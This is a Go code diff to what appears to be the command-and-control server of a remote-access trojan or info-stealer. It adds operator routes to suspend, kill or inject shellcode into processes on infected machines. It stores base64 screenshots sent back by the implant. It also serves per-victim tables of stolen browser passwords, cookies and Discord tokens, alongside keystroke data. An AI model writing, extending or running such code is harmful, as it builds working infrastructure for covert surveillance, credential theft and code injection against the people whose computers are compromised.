@@ -79,6 +79,13 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 			op.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
 			op.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))
 
+			// Process control — the agent runs these on its next poll.
+			op.GET("/agents/:id/processes", getProcessesHandler(taskQueue))
+			op.POST("/agents/:id/processes/suspend", processCommandHandler(taskQueue, "process_suspend"))
+			op.POST("/agents/:id/processes/resume", processCommandHandler(taskQueue, "process_resume"))
+			op.POST("/agents/:id/processes/kill", processCommandHandler(taskQueue, "process_kill"))
+			op.POST("/agents/:id/processes/inject", processCommandHandler(taskQueue, "process_inject"))
+
 			op.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
 			op.GET("/tasks/:id", getTaskHandler(taskQueue))
 			op.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))
@@ -199,6 +206,15 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue, fi
 				}
 				_ = taskQueue.UpdateStatus(msg.TaskID, status)
 				taskQueue.HandleResult(msg.TaskID, msg.Output, msg.Code)
+				// A screenshot task's result IS the image (base64 JPEG from the
+				// stub) — persist it so the Screenshot tab has something to show.
+				if status == "completed" && db != nil {
+					var cmd string
+					_ = db.Get(&cmd, "SELECT COALESCE(command,'') FROM tasks WHERE id = ?", msg.TaskID)
+					if strings.Contains(strings.ToLower(cmd), "screenshot") && len(msg.Output) > 512 {
+						storeScreenshotResult(db, a.ID, msg.Output)
+					}
+				}
 			}
 			c.JSON(http.StatusOK, gin.H{"status": "ok"})
 			return
@@ -264,6 +280,42 @@ func getAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
 	}
 }
 
+// storeScreenshotResult persists a completed screenshot task's base64 payload.
+// Bytes go to Blob when configured (durable), otherwise under data/screenshots.
+func storeScreenshotResult(database *sqlx.DB, agentID, b64 string) {
+	data, err := base64.StdEncoding.DecodeString(strings.TrimSpace(b64))
+	if err != nil || len(data) < 64 {
+		return
+	}
+	id := uuid.New().String()
+	fn := id + ".png"
+
+	var marker string
+	if filetransfer.BlobEnabled() {
+		m, berr := filetransfer.StoreIntoBlob(id, data)
+		if berr == nil {
+			marker = m
+		}
+	}
+	path := marker
+	if path == "" {
+		dir := filepath.Join("data", "screenshots")
+		_ = os.MkdirAll(dir, 0755)
+		path = filepath.Join(dir, fn)
+		if werr := os.WriteFile(path, data, 0644); werr != nil {
+			log.Printf("[screenshot] local save: %v", werr)
+			return
+		}
+	}
+	_, err = database.Exec(`INSERT INTO screenshots (id, agent_id, filename, file_path, size) VALUES (?, ?, ?, ?, ?)`,
+		id, agentID, fn, path, len(data))
+	if err != nil {
+		log.Printf("[screenshot] insert: %v", err)
+		return
+	}
+	log.Printf("[screenshot] stored %s (%d bytes, blob=%v)", id, len(data), marker != "")
+}
+
 func deleteAgentHandler(agentMgr *agent.Manager, fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		id := c.Param("id")
@@ -294,6 +346,80 @@ func updateAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
 		}
 		// Apply updates (simplified)
 		c.JSON(http.StatusOK, a)
+	}
+}
+
+// processCommandHandler enqueues a process control command for the agent.
+// The agent's task poller picks it up on the next /beacon.
+func processCommandHandler(taskQueue *task.Queue, command string) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		var req struct {
+			PID       int    `json:"pid"`
+			Shellcode string `json:"shellcode"`
+		}
+		if err := c.ShouldBindJSON(&req); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+			return
+		}
+		if req.PID <= 0 && command != "process_list" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "pid required"})
+			return
+		}
+		args := map[string]any{"pid": req.PID}
+		if command == "process_inject" {
+			if strings.TrimSpace(req.Shellcode) == "" {
+				c.JSON(http.StatusBadRequest, gin.H{"error": "shellcode required"})
+				return
+			}
+			args["shellcode"] = req.Shellcode
+		}
+		t, err := taskQueue.Enqueue(agentID, command, args, 5)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, t)
+	}
+}
+
+// getProcessesHandler serves the agent's latest process snapshot. The agent
+// pushes the list itself (process_list task result); the handler reads the most
+// recent result for this agent out of the tasks table so a page refresh works
+// without re-running anything.
+func getProcessesHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		if taskQueue == nil || db == nil {
+			c.JSON(http.StatusOK, []interface{}{})
+			return
+		}
+		var last struct {
+			Result string `db:"result"`
+		}
+		err := db.Get(&last, `
+			SELECT COALESCE(result,'') as result FROM tasks
+			WHERE agent_id = ? AND command = 'process_list' AND status = 'completed'
+			ORDER BY completed_at DESC LIMIT 1`, agentID)
+		if err != nil || strings.TrimSpace(last.Result) == "" {
+			c.JSON(http.StatusOK, []interface{}{})
+			return
+		}
+		// The agent returns "pid\tppid\tname" lines from the stub's processList.
+		out := []map[string]any{}
+		for _, line := range strings.Split(strings.ReplaceAll(last.Result, "\r\n", "\n"), "\n") {
+			fields := strings.Split(line, "\t")
+			if len(fields) < 3 {
+				continue
+			}
+			pid, _ := strconv.Atoi(fields[0])
+			ppid, _ := strconv.Atoi(fields[1])
+			out = append(out, map[string]any{
+				"PID": pid, "PPID": ppid, "Name": fields[2],
+				"User": "", "CPU": 0, "Memory": 0, "Path": "", "Args": "", "Status": "running",
+			})
+		}
+		c.JSON(http.StatusOK, out)
 	}
 }
 
@@ -570,15 +696,45 @@ func deleteFileTransferHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 }
 
 func getCredentialsHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	agentID := c.Param("id")
+	if db == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	var rows []map[string]any
+	if err := db.Select(&rows, `SELECT id, url, username, password, extracted_at as created_at FROM credentials WHERE agent_id = ? ORDER BY extracted_at DESC LIMIT 500`, agentID); err != nil || rows == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	c.JSON(http.StatusOK, rows)
 }
 
 func getCookiesHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	agentID := c.Param("id")
+	if db == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	var rows []map[string]any
+	if err := db.Select(&rows, `SELECT id, host, name, value, extracted_at as created_at FROM cookies WHERE agent_id = ? ORDER BY extracted_at DESC LIMIT 500`, agentID); err != nil || rows == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	c.JSON(http.StatusOK, rows)
 }
 
 func getDiscordTokensHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	agentID := c.Param("id")
+	if db == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	var rows []map[string]any
+	if err := db.Select(&rows, `SELECT id, token, email, username, discriminator, extracted_at as created_at FROM discord_tokens WHERE agent_id = ? ORDER BY extracted_at DESC LIMIT 500`, agentID); err != nil || rows == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	c.JSON(http.StatusOK, rows)
 }
 
 func getKeystrokesHandler(c *gin.Context) {
@@ -604,7 +760,18 @@ func getKeystrokesHandler(c *gin.Context) {
 }
 
 func getScreenshotsHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	agentID := c.Param("id")
+	if db == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	var rows []map[string]any
+	err := db.Select(&rows, `SELECT id, filename, file_path, width, height, size, captured_at FROM screenshots WHERE agent_id = ? ORDER BY captured_at DESC LIMIT 200`, agentID)
+	if err != nil || rows == nil {
+		c.JSON(http.StatusOK, []interface{}{})
+		return
+	}
+	c.JSON(http.StatusOK, rows)
 }
 
 func downloadScreenshotHandler(c *gin.Context) {
@@ -637,10 +804,32 @@ func downloadScreenshotHandler(c *gin.Context) {
 	c.Header("Content-Transfer-Encoding", "binary")
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fn))
 	c.Header("Content-Type", "image/png")
-	c.File(path)
+
+	if host, blobID, ok := filetransfer.ParseBlobRef(shot.FilePath); ok {
+		data, rerr := filetransfer.ReadBlob(host, blobID)
+		if rerr != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": rerr.Error()})
+			return
+		}
+		c.Data(http.StatusOK, "image/png", data)
+		return
+	}
+	c.File(shot.FilePath)
 }
 
 func deleteScreenshotHandler(c *gin.Context) {
+	id := c.Param("id")
+	if db != nil {
+		var p string
+		if err := db.Get(&p, "SELECT COALESCE(file_path,'') FROM screenshots WHERE id = ?", id); err == nil && p != "" {
+			if host, blobID, ok := filetransfer.ParseBlobRef(p); ok {
+				go filetransfer.DeleteBlobTransfer(host, blobID)
+			} else {
+				_ = os.Remove(p)
+			}
+		}
+		_, _ = db.Exec("DELETE FROM screenshots WHERE id = ?", id)
+	}
 	c.JSON(http.StatusOK, gin.H{"message": "Screenshot deleted"})
 }
 
